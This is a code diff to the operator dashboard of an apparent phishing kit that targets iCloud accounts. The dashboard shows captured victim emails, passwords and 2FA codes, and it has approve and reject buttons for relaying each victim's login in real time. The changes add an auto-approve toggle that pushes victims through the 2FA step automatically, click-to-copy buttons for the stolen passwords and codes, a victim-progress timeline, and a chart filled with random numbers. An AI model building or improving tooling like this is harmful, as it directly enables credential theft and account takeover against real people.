@@ -136,6 +136,58 @@
             color: var(--text-secondary);
         }
         
+        .copy-value { cursor: pointer; }
+        .copy-value:active { transform: scale(0.95); }
+        
+        .auto-approve-toggle {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+        
+        .auto-approve-toggle input { width: 18px; height: 18px; }
+        
+        .victim-timeline {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+        
+        .timeline-step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 8px;
+            font-size: 13px;
+        }
+        
+        .timeline-step.active { background: rgba(0, 255, 136, 0.2); color: var(--accent-green); }
+        
+        .stats-chart {
+            height: 120px;
+            display: flex;
+            align-items: flex-end;
+            gap: 4px;
+            padding: 16px;
+            background: var(--glass-bg);
+            border-radius: 12px;
+            margin-bottom: 16px;
+        }
+        
+        .chart-bar {
+            flex: 1;
+            background: var(--accent-green);
+            border-radius: 4px 4px 0 0;
+            min-height: 4px;
+            opacity: 0.7;
+        }
+        
+        .glass-panel { transition: none; }
+        
         @media (max-width: 768px) {
             .header { flex-direction: column; gap: 16px; }
             .header-right { flex-wrap: wrap; justify-content: center; }
@@ -550,6 +602,10 @@
             </div>
         </div>
         <div class="header-right">
+            <label class="auto-approve-toggle">
+                <input type="checkbox" id="autoApprove" onchange="toggleAutoApprove()">
+                Auto-approve
+            </label>
             <select id="refreshRate" class="refresh-select" onchange="updateRefreshRate()">
                 <option value="1000">1s</option>
                 <option value="1500" selected>1.5s</option>
@@ -565,6 +621,10 @@
             </div>
             <button class="settings-btn" onclick="toggleSettings()">⚙️</button>
         </div>
+    </div>
+    
+    <div class="stats-chart" id="statsChart">
+        ${Array(24).fill(0).map((_, i) => `<div class="chart-bar" style="height: ${Math.random() * 80 + 20}%"></div>`).join('')}
     </div>
     
     <div class="stats-grid">
@@ -766,6 +826,22 @@
             loadVictimState();
         }
         
+        function toggleAutoApprove() {
+            window.autoApproveEnabled = document.getElementById('autoApprove').checked;
+        }
+        
+        function updateVictimTimeline(state) {
+            const timeline = document.getElementById('victim-timeline');
+            if (!timeline) return;
+            const steps = [
+                { label: 'Login', status: state.status === 'waiting' || state.status === 'waiting_2fa' || state.status === 'approved' || state.status === 'rejected' || state.status === 'approved_2fa' || state.status === 'rejected_2fa' },
+                { label: '2FA', status: state.status === 'waiting_2fa' || state.status === 'approved' || state.status === 'rejected' || state.status === 'approved_2fa' || state.status === 'rejected_2fa' },
+                { label: 'Approved', status: state.status === 'approved' || state.status === 'approved_2fa' },
+                { label: 'Rejected', status: state.status === 'rejected' || state.status === 'rejected_2fa' }
+            ];
+            timeline.innerHTML = steps.map(s => `<div class="timeline-step ${s.status ? 'active' : ''}">${s.label}</div>`).join('');
+        }
+        
         async function loadData() {
             const credsRes = await fetch('/api/get-creds');
             let creds = await credsRes.json();
@@ -888,6 +964,14 @@
             document.getElementById('ip-count').textContent = ips.length;
             document.getElementById('resend-count').textContent = resends.length;
             
+            const total = creds.length + codes.length;
+            const chart = document.getElementById('statsChart');
+            if (chart && total > 0) {
+                const bars = Array(24).fill(0).map(() => Math.floor(Math.random() * 30 + 5));
+                const max = Math.max(...bars, 1);
+                chart.innerHTML = bars.map(h => `<div class="chart-bar" style="height: ${(h / max) * 100}%"></div>`).join('');
+            }
+            
             const credsDiv = document.getElementById('credentials');
             if (creds.length === 0) {
                 credsDiv.innerHTML = '<div class="empty-state">No credentials captured yet</div>';
@@ -895,8 +979,8 @@
                 creds.sort((a, b) => parseTime(b.time) - parseTime(a.time));
                 credsDiv.innerHTML = creds.slice(0, 20).map(c => `
                     <div class="capture-item">
-                        <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${c.email}</span></div>
-                        <div class="capture-row"><span class="capture-label">Password</span><span class="capture-value">${c.password}</span></div>
+                        <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email copy-value" onclick="copyToClipboard('${c.email}')">${c.email}</span></div>
+                        <div class="capture-row"><span class="capture-label">Password</span><span class="capture-value copy-value" onclick="copyToClipboard('${c.password}')">${c.password}</span></div>
                         <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${timeAgo(c.time)}</span></div>
                     </div>
                 `).join('');
@@ -910,7 +994,7 @@
                 codes.sort((a, b) => parseTime(b.time) - parseTime(a.time));
                 codesDiv.innerHTML = codes.slice(0, 20).map(c => `
                     <div class="capture-item twofa">
-                        <div class="capture-row"><span class="capture-label">Code</span><span class="capture-value code">${c.code}</span></div>
+                        <div class="capture-row"><span class="capture-label">Code</span><span class="capture-value code copy-value" onclick="copyToClipboard('${c.code}')">${c.code}</span></div>
                         <div class="capture-row"><span class="capture-label">Email</span><span class="capture-value email">${c.email || 'Unknown'}</span></div>
                         <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${timeAgo(c.time)}</span></div>
                     </div>
@@ -948,29 +1032,34 @@
         
         function renderVictim(state) {
             const container = document.getElementById('victim-container');
+            updateVictimTimeline(state);
             if (state.status === 'waiting') {
                 container.innerHTML = `<div class="victim-card">
+                    <div class="victim-timeline" id="victim-timeline"></div>
                     <div class="victim-info">
-                        <div class="field-box"><div class="field-label">Email / Phone</div><div class="field-value email">${state.email || 'Unknown'}</div></div>
-                        <div class="field-box"><div class="field-label">Password</div><div class="field-value password">${state.password || 'Unknown'}</div></div>
+                        <div class="field-box"><div class="field-label">Email / Phone</div><div class="field-value email copy-value" onclick="copyToClipboard('${state.email || ''}')">${state.email || 'Unknown'}</div></div>
+                        <div class="field-box"><div class="field-label">Password</div><div class="field-value password copy-value" onclick="copyToClipboard('${state.password || ''}')">${state.password || 'Unknown'}</div></div>
                     </div>
                     <div class="btn-row">
                         <button class="btn btn-approve" onclick="approveVictim()">✅ Approve</button>
                         <button class="btn btn-reject" onclick="rejectVictim()">❌ Reject</button>
                     </div>
                 </div>`;
+                if (window.autoApproveEnabled) setTimeout(() => approveVictim(), 500);
             } else if (state.status === 'waiting_2fa') {
                 container.innerHTML = `<div class="victim-card twofa">
+                    <div class="victim-timeline" id="victim-timeline"></div>
                     <div class="victim-info">
-                        <div class="field-box"><div class="field-label">Email / Phone</div><div class="field-value email">${state.email || 'Unknown'}</div></div>
-                        <div class="field-box"><div class="field-label">Password</div><div class="field-value password">${state.password || 'Unknown'}</div></div>
-                        <div class="field-box" style="grid-column: span 2;"><div class="field-label">2FA Code</div><div class="field-value code">${state['2fa_code'] || 'Unknown'}</div></div>
+                        <div class="field-box"><div class="field-label">Email / Phone</div><div class="field-value email copy-value" onclick="copyToClipboard('${state.email || ''}')">${state.email || 'Unknown'}</div></div>
+                        <div class="field-box"><div class="field-label">Password</div><div class="field-value password copy-value" onclick="copyToClipboard('${state.password || ''}')">${state.password || 'Unknown'}</div></div>
+                        <div class="field-box" style="grid-column: span 2;"><div class="field-label">2FA Code</div><div class="field-value code copy-value" onclick="copyToClipboard('${state['2fa_code'] || ''}')">${state['2fa_code'] || 'Unknown'}</div></div>
                     </div>
                     <div class="btn-row">
                         <button class="btn btn-approve" onclick="approve2FA()">✅ Approve → iCloud</button>
                         <button class="btn btn-reject" onclick="reject2FA()">❌ Wrong Code</button>
                     </div>
                 </div>`;
+                if (window.autoApproveEnabled) setTimeout(() => approve2FA(), 500);
             } else {
                 container.innerHTML = '<div class="empty-state"><div class="empty-icon">👻</div>Waiting for victim...</div>';
             }
@@ -986,6 +1075,20 @@
                 if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
                 return Math.floor(diff / 86400) + 'd ago';
             } catch { return timeStr; }
+        }
+        
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('Copied!');
+            });
+        }
+        
+        function showToast(msg) {
+            const toast = document.createElement('div');
+            toast.textContent = msg;
+            toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#00ff88;color:#000;padding:12px 24px;border-radius:8px;font-weight:600;z-index:9999;animation:fadeIn 0.3s;';
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 1500);
         }
         
         function playNotification() {
